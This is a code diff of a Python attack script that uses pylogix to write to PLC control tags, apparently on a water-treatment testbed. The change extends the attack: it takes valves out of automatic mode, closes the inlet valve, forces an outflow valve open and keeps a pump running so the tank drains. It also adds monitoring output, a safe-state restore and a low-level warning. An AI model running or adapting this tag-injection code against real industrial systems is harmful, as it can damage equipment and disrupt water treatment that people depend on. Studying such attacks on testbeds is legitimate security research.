@@ -18,18 +18,24 @@ import argparse, time, signal
 from datetime import datetime
 from pylogix import PLC
 
-# Attack: close MV101 only — P101 stays ON, tank drains
+# Attack: close MV101 (stop inflow) + open MV201 (force outflow to P2)
+# P101 stays ON — triple drain: pump + MV201 both pulling from tank
 ATTACK_CMDS = [
     ('HMI_MV101.Auto', False),   # take MV101 out of auto
     ('HMI_MV101.Cmd',  1),       # CLOSE inlet valve — stop inflow
-    # P101 intentionally left ON — pump drains the tank actively
+    ('HMI_MV201.Auto', False),   # take MV201 out of auto (PLC2)
+    ('HMI_MV201.Cmd',  2),       # OPEN MV201 — force outflow to P2
+    # P101 intentionally left ON — tank drains via pump + MV201 simultaneously
 ]
 
 # Safe state restore
 SAFE_CMDS = [
     ('HMI_MV101.Auto', False),
-    ('HMI_MV101.Cmd',  2),       # OPEN valve
+    ('HMI_MV101.Cmd',  2),       # OPEN MV101
     ('HMI_MV101.Auto', True),    # restore auto
+    ('HMI_MV201.Auto', False),
+    ('HMI_MV201.Cmd',  1),       # CLOSE MV201 back
+    ('HMI_MV201.Auto', True),    # restore auto
     ('HMI_P101.Auto',  False),
     ('HMI_P101.Cmd',   2),       # ensure pump ON
     ('HMI_P101.Auto',  True),    # restore auto
@@ -96,16 +102,17 @@ def inject_loop(plc, duration, interval=1.0):
         cycle += 1
         remaining = max(0, int(end_time - time.time()))
 
+        mv201 = plc.Read('HMI_MV201.Cmd').Value
         if errors:
             print(f"[{ts()}] cycle={cycle:4d}  ERRORS: {errors}")
         else:
             print(f"[{ts()}] cycle={cycle:4d}  "
                   f"MV101={'CLOSED' if mv==1 else 'OPEN '}  "
+                  f"MV201={'OPEN' if mv201==2 else 'CLOSED'}  "
                   f"P101.Auto={p1a}  "
                   f"LIT101={lit:.1f}mm  "
                   f"FIT101={fit:.3f}L/s  "
                   f"[{remaining}s left]")
-
             # Safety warning if getting critically low
             if lit is not None and lit < 280:
                 print(f"  *** WARNING: LIT101={lit:.1f}mm approaching LL (250mm) ***")
